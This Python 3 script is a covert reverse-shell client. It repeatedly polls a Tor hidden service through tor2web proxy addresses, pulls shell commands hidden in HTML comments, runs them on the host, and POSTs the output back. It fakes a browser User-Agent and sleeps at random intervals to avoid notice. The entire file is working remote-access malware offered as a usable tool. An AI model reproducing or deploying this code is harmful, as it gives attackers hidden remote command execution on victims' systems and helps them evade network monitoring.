# python 3

# requires reverse_https-tor2web_listener.py running as a tor hidden service on connect back host
# encoding is not quite right - multi-line returns (e.g., that of `dir`) format poorly

from urllib.request import urlopen,Request
from urllib.parse import urlencode
from urllib.error import URLError
from subprocess import Popen,PIPE
from random import randint
from time import sleep

# change this to the Tor HS identifier + tor2web server
# todo - cycle through various t2w servers if one is not responding
url = 'https://xmgem22g7efpwwqd.tor2web.org/'
#url = 'https://xmgem22g7efpwwqd.tor2web.fi/'
#url = 'https://xmgem22g7efpwwqd.onion.sh/'

headers = {
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Charset' : 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
    'Accept-Language' : 'en-US,en;q=0.8',
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31',
    }

active = False

while True:
    # set up POST to url
    data = {'stage' : 'probe',}
    data = urlencode(data)
    data = bytes(data, 'UTF-8')

    req = Request(url, data, headers)
    
    try:
        response = urlopen(req)
        html = response.readlines(512)
        for l in html:
            l = str(l)
            if '<!-- t2wsh;;' in str(l):
                cmd = l.split(';;')[1]
                if cmd == 'endsession':
                    exit()
                elif len(cmd) > 0:
                    #print('\n\nreceived command: %s' % (cmd))
                    proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
                    cmdout = proc.stdout.read() + proc.stderr.read()
                    data =  { 'stage' : 'output', 'cmdout' : '%s' % (cmdout), }
                    print(q for q in data)
                    data = urlencode(data)
                    print(data)
                    data = bytes(data, 'UTF-8')
                    print(data)
                    req = Request(url, data, headers)
                    response = urlopen(req)
                    active = True
                else:
                    break
            else:
                active = False
    except URLError as e:
        # tor2web proxies are unreliable - this condition may occur
        # frequently even with a fully functional listener and internet
        # connection. Waiting helps.
        print('Error opening URL: %s' % (e))
        active = False
            
    if not active:
        # sleep for a while
        t = randint(10,60)
        print('sleeping %s' % (t))
        sleep(t)
